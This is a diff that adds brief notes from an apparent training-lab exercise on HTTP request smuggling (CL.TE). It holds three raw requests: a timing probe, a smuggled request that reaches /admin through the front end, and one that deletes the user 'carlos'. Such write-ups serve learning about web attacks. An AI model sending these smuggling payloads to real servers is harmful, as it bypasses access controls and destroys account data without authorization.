@@ -1,0 +1,48 @@
+Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+Analysis:
+(1)
+POST / HTTP/1.1
+Host: 0a84002a0325e7f08347878d00de0012.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+x
+-------> timeout (CL.TE)
+
+(2)
+POST / HTTP/1.1
+Host: 0a84002a0325e7f08347878d00de0012.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+-------> Given admin access
+
+(3)
+POST / HTTP/1.1
+Host: 0a84002a0325e7f08347878d00de0012.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+-----------> Deleted carlos
